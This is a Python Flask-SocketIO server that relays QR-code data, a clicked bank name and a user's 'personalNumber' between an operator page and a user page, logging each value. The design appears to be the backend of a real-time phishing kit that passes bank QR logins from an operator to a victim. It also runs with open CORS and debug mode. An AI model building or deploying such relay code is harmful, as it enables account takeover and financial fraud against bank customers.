from flask import Flask, render_template
from flask_socketio import SocketIO, emit
import qrcode
import base64
from io import BytesIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")  

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/user')
def user():
    return render_template('user.html')

@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[DEBUG] QR Code received: {qr_data}")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    socketio.emit('update_qr_code_image', {'qr_image': img_base64})

@socketio.on('step_completed')
def handle_step_completion(data):
    step_number = data['step']
    scanned_data = data['data']
    print(f"[DEBUG] Step {step_number} completed with data: {scanned_data}")
    socketio.emit('step_completed', {'step': step_number, 'data': scanned_data})

@socketio.on('complete_step')
def complete_step(data):
    print(f"Emitting complete_step event with data: {data}")
    socketio.emit('complete_step', data)

@socketio.on('bank_clicked')
def handle_bank_clicked(data):
    bank_name = data['bankName']
    print(f"[DEBUG] Bank clicked: {bank_name}")
    socketio.emit('bank_clicked', {'bankName': bank_name})

@socketio.on('personalNumber')
def handle_personalNumber(data):
    personalNumber = data['personalNumber']
    print(f"[DEBUG] personal Number: {personalNumber}")
    socketio.emit('personalNumber', {'personalNumber': personalNumber})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
    # socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
